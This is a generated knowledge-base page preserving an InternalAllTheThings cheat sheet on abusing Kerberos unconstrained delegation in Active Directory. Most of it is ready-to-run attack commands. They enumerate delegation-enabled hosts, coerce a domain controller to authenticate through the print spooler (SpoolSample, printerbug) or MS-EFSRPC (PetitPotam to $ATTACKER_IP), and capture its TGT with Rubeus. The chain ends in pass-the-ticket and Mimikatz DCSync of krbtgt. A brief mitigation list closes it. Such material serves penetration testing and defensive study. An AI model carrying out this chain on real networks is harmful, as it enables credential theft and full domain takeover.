---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Kerberos Delegation - Unconstrained Delegation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-kerberos-delegation-unconstrained` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-delegation-unconstrained.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Kerberos Delegation - Unconstrained Delegation](../../topics/active-directory/kerberos-delegation-unconstrained-delegation.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-kerberos-delegation-unconstrained |
| name | Kerberos Delegation - Unconstrained Delegation |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/kerberos-delegation-unconstrained.md |

## Preserved Source Material

````yaml
_body: "# Kerberos Delegation - Unconstrained Delegation\n\n> The user sends a ST to access the service, along with their\
  \ TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the\
  \ user.\n> When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated\
  \ user's TGT ticket gets saved to that computer's memory.\n\n:warning: Unconstrained delegation used to be the only option\
  \ available in Windows 2000\n\n> **Warning**\n> Remember to coerce to a HOSTNAME if you want a Kerberos Ticket\n\n## SpoolService\
  \ Abuse with Unconstrained Delegation\n\nThe goal is to gain DC Sync privileges using a computer account and the SpoolService\
  \ bug.\n\n**Requirements**:\n\n- Object with Property **Trust this computer for delegation to any service (Kerberos only)**\n\
  - Must have **ADS_UF_TRUSTED_FOR_DELEGATION**\n- Must not have **ADS_UF_NOT_DELEGATED** flag\n- User must not be in the\
  \ **Protected Users** group\n- User must not have the flag **Account is sensitive and cannot be delegated**\n\n### Find\
  \ delegation\n\n:warning: : Domain controllers usually have unconstrained delegation enabled.\nCheck the `TRUSTED_FOR_DELEGATION`\
  \ property.\n\n- [ADModule](https://github.com/samratashok/ADModule)\n\n  ```powershell\n  # From https://github.com/samratashok/ADModule\n\
  \  PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}\n  ```\n\n- [bloodyAD](https://github.com/CravateRouge/bloodyAD)\n\
  \n  ```ps1\n  bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'\
  \ --attr sAMAccountName,userAccountControl\n  ```\n  \n- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)\n\n\
  \  ```powershell\n  $> ldapdomaindump -u \"DOMAIN\\\\Account\" -p \"Password123*\" 10.10.10.10   \n  grep TRUSTED_FOR_DELEGATION\
  \ domain_computers.grep\n  ```\n\n- [netexec module](https://github.com/Pennyw0rth/NetExec/wiki)\n\n  ```powershell\n  nxc\
  \ ldap 10.10.10.10 -u username -p password --trusted-for-delegation\n  ```\n\n- BloodHound: `MATCH (c:Computer {unconstraineddelegation:true})\
  \ RETURN c`\n- Powershell Active Directory module: `Get-ADComputer -LDAPFilter \"(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\"\
  \ -Properties DNSHostName,userAccountControl`\n\n### SpoolService status\n\nCheck if the spool service is running on the\
  \ remote host\n\n```powershell\nls \\\\dc01\\pipe\\spoolss\npython rpcdump.py DOMAIN/user:password@10.10.10.10\n```\n\n\
  ### Monitor with Rubeus\n\nMonitor incoming connections from Rubeus.\n\n```powershell\nRubeus.exe monitor /interval:1 \n\
  ```\n\n### Force a connect back from the DC\n\nDue to the unconstrained delegation, the TGT of the computer account (DC$)\
  \ will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account\
  \ has DCSync rights over the domain object.\n\n> SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary\
  \ server using a \"feature\" in the MS-RPRN RPC interface.\n\n```powershell\n# From https://github.com/leechristensen/SpoolSample\n\
  .\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME\n.\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB\n\
  # DC01.HACKER.LAB is the domain controller we want to compromise\n# HELPDESK.HACKER.LAB is the machine with delegation enabled\
  \ that we control.\n\n# From https://github.com/dirkjanm/krbrelayx\nprinterbug.py 'domain/username:password'@<VICTIM-DC-NAME>\
  \ <UNCONSTRAINED-SERVER-DC-NAME>\n\n# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689\n\
  python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>\n```\n\nIf the attack\
  \ worked you should get a TGT of the domain controller.\n\n### Load the ticket\n\nExtract the base64 TGT from Rubeus output\
  \ and load it to our current session.\n\n```powershell\n.\\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local\
  \ /ptt\n```\n\nAlternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekurlsa::tickets`\n\nThen you\
  \ can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\\krbtgt`\n\n### Mitigation\n\n- Ensure sensitive\
  \ accounts cannot be delegated\n- Disable the Print Spooler Service\n\n## MS-EFSRPC Abuse with Unconstrained Delegation\n\
  \nUsing `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.\n\n```bash\n\
  # Coerce the callback\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD\
  \ $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\n\n# Extract the ticket\n.\\\
  Rubeus.exe asktgs /ticket:<ticket base64> /ptt\n```\n\n## References\n\n- [Exploiting Unconstrained Delegation - Riccardo\
  \ Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)\n- [Hunting in Active\
  \ Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)\n\
  - [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - Elad Shamir - 28 January\
  \ 2019](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)"
_relative_path: active-directory/kerberos-delegation-unconstrained.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/kerberos-delegation-unconstrained.md
````
